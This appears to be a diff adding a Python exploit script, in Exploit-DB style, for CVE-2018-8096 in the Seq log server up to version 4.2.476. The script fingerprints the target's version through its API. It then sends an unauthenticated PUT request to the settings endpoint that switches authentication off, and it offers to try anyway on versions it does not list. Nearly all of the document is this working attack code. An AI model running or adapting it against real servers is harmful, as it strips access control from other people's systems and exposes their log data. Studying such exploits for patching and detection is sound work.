@@ -1,0 +1,82 @@
+# Exploit Title: Seq 4.2.476 - Authentication Bypass
+# Date: 2018-08-02
+# Exploit Author: Daniel Chactoura
+# Vendor Homepage: https://getseq.net/
+# Software Link: https://getseq.net/Download/All
+# Version: <= 4.2.476
+# CVE : CVE-2018-8096
+# Post Reference: https://medium.com/stolabs/bypass-admin-authentication-on-seq-17f0f9e02732
+
+# coding=utf-8
+
+#!/bin/python
+
+import sys
+import requests
+
+def verifyArgs(args):
+    if len(args) < 2:
+        print('[!] Usage: '+str(args[0])+' https://target')
+        exit(0)
+    elif 'http' not in str(args[1]):
+        print('''[!] Missing "https://" !''')
+        exit(0)
+    else:
+        return(1)
+
+def verifyVersion(url):
+    vulnVersions = ['4.2.476','4.2.470','4.1.17','4.1.16',
+                    '4.1.14','4.0.60','4.0.58','3.4.20',
+                    '3.4.18','3.4.17','3.3.23','3.3.22',
+                    '3.3.21','3.3.20','3.2.16','3.1.17',
+                    '3.1.16','3.0.30','2.4.2','2.3.4',
+                    '2.3.3','2.2.8','2.1.22','2.1.21',
+                    '2.0.19','1.6.13','1.6.12','1.6.11',
+                    '1.6.10','1.6.9','1.6.8','1.6.7',
+                    '1.6.6','1.6.5','1.6.4','1.5.19',
+                    '1.5.18','1.5.17','1.5.16','1.4.12',
+                    '1.4.11','1.4.10','1.4.9','1.4.8',
+                    '1.4.7','1.4.6','1.3.11','1.3.10',
+                    '1.3.9','1.3.8']
+    u = str(url)
+    verifV = requests.get(u+'/api/')
+    verifVJSON = verifV.json()
+    ver = str(verifVJSON['Version'])[:-2]
+
+    if ver in vulnVersions:
+        print("[+] Seq's version is potentially vulnerable!")
+        return(1)
+    else:
+        print("[!] Seq's version is probably not vulnerable!")
+        return(0)
+
+def bypassAuth(url):
+    u = str(url)
+    payload = "{'Name':'isauthenticationenabled','Value':false,'Id':'setting-isauthenticationenabled','Links':{'Self':'api/settings/setting-isauthenticationenabled','Group':'api/settings/resources'}}"
+    h = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0', 'Referer':u}
+    verifM = requests.put(u+'/api/settings/setting-isauthenticationenabled', data=payload, headers=h)
+    verifMCode = str(verifM.status_code)
+    if verifMCode == '200':
+        print("[:)] YES! Success! Now, access the url and have fun!")
+    else:
+        print("[:(] DAMN! This is not your lucky day...")
+
+def main():
+    try:
+        if verifyArgs(sys.argv):
+            if verifyVersion(sys.argv[1]):
+                bypassAuth(sys.argv[1])
+            else:
+                c = input('[?] Do you want to try it anyway? (y/n): ').lower()
+                if c == 'y':
+                    pass
+                elif c == 'n':
+                    exit(0)
+                else:
+                    print('[!] Invalid choice!')
+                    exit(0)
+    except KeyboardInterrupt:
+        exit(0)
+
+if __name__ == '__main__':
+    main()
